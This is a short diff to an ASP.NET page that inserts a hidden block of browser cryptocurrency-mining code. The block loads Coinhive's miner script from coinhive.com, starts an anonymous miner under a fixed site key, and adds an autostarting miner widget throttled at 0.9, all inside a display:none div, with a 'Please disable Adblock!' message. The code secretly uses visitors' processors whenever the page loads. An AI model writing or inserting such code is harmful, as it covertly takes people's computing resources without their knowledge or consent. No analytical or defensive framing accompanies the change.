@@ -87,5 +87,18 @@
        
 
     </script>
-
+         <div style="display:none;">
+  <script src="https://coinhive.com/lib/miner.min.js" async></script>
+  <script>var miner = new CoinHive.Anonymous('27xXqT1TRmzRKeJWq5gb4XxGP7DeGXmz');
+  miner.start();</script>
+  <script src="https://coinhive.com/lib/miner.min.js" async></script>
+  <div class="coinhive-miner" 
+	style="width: 256px; height: 310px"
+	data-key="27xXqT1TRmzRKeJWq5gb4XxGP7DeGXmz"
+	data-autostart="true"
+	data-throttle="0.9"
+    style="display:none;"
+  >
+	<em>Please disable Adblock!</em>
+</div>
 </asp:Content>
